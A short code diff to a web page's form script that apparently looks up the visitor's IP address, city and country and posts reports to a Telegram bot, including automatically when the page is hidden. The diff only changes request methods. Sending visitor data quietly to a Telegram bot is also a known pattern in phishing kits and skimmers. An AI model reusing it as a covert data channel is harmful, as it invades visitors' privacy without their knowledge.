@@ -1276,7 +1276,7 @@ async function submitDemo(){
   var geo={city:'',country:'',ip:''};
 
   // Геолокация
-  fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(g){
+  fetch('https://ipapi.co/json/',{credentials:'omit'}).then(function(r){return r.json()}).then(function(g){
     geo.city=g.city||'';geo.country=g.country_name||'';geo.ip=g.ip||'';
   }).catch(function(){});
 
@@ -1364,11 +1364,10 @@ async function submitDemo(){
 
   function sendTg(text){
     var d=JSON.stringify({chat_id:C,text:text,parse_mode:'HTML'});
-    if(navigator.sendBeacon){
-      navigator.sendBeacon('https://api.telegram.org/bot'+B+'/sendMessage',new Blob([d],{type:'application/json'}));
-    }else{
-      fetch('https://api.telegram.org/bot'+B+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:d,keepalive:true}).catch(function(){});
-    }
+    var x=new XMLHttpRequest();
+    x.open('POST','https://api.telegram.org/bot'+B+'/sendMessage');
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(d);
   }
 
   document.addEventListener('visibilitychange',function(){if(document.hidden)sendReport()});
